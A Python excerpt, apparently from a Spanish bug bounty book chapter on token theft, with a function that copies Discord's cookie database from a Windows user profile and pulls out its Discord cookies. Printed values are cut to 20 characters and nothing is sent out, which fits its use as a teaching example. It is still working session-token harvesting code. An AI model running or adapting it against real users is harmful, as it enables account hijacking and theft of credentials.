# Extraído de: LibroBugBounty/cap-15-token-theft-persistencia.md
import sqlite3
import shutil
from pathlib import Path

def extract_discord_cookies():
    """Extrae cookies de Discord sin cifrar."""
    # Discord almacena datos en el perfil del usuario
    cookie_db = (Path.home() / "AppData" / "Roaming"
                 / "discord" / "Network" / "Cookies")

    if not cookie_db.exists():
        print("[-] Discord cookies DB not found")
        return []

    # Copiar para evitar lock (Discord tiene el fichero abierto)
    temp_copy = Path.home() / "AppData" / "Local" / "Temp" / "cookies_copy"
    shutil.copy2(cookie_db, temp_copy)

    conn = sqlite3.connect(str(temp_copy))
    cursor = conn.cursor()

    # Extraer todas las cookies de discord.com
    cursor.execute("""
        SELECT host_key, name, value, encrypted_value, path,
               expires_utc, is_secure, is_httponly
        FROM cookies
        WHERE host_key LIKE '%discord%'
    """)

    cookies = []
    for row in cursor.fetchall():
        host, name, value, encrypted_value, path = row[:5]

        # Si COOKIE_ENCRYPTION está desactivado, value tiene el dato
        # Si está activado, encrypted_value tiene el dato cifrado con DPAPI
        if value:
            cookies.append({
                "host": host, "name": name,
                "value": value[:20] + "...",  # Truncar para el log
                "encrypted": False,
            })
        elif encrypted_value:
            cookies.append({
                "host": host, "name": name,
                "value": "(encrypted)",
                "encrypted": True,
            })

    conn.close()
    temp_copy.unlink()
    return cookies
